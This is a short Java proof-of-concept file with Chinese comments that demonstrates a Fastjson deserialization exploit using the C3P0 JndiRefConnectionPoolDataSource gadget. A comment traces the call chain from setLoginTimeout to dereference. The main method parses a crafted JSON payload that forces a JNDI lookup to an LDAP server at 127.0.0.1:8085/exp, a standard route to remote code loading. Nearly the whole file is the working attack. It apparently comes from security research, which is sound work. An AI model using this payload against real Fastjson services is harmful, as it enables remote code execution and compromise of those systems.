/**
 * @Description
 * @Author dragonkeep
 * @Date 2024/12/18
 */
import com.alibaba.fastjson.JSON;
/*
* 调用链:
* JndiRefConnectionPoolDataSource.setLoginTimeout()
*   WrapperConnectionPoolDataSource.setLoginTimeout()
*       DataSource.setLoginTimeout()
*           JndiRefForwardingDataSource.setLoginTimeout()
*               JndiRefForwardingDataSource.dereference()
* */
/*
* setLoginTimout 方法，需要fastjson,Jackjson
*
* */



public class C3P0_JNDI {
    public static void main(String[] args) throws Exception{
        String payload="{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\","+
                "\"jndiName\":\"ldap://127.0.0.1:8085/exp\",\"LoginTimeout\":\"1\"}";
        JSON.parse(payload);
    }
}
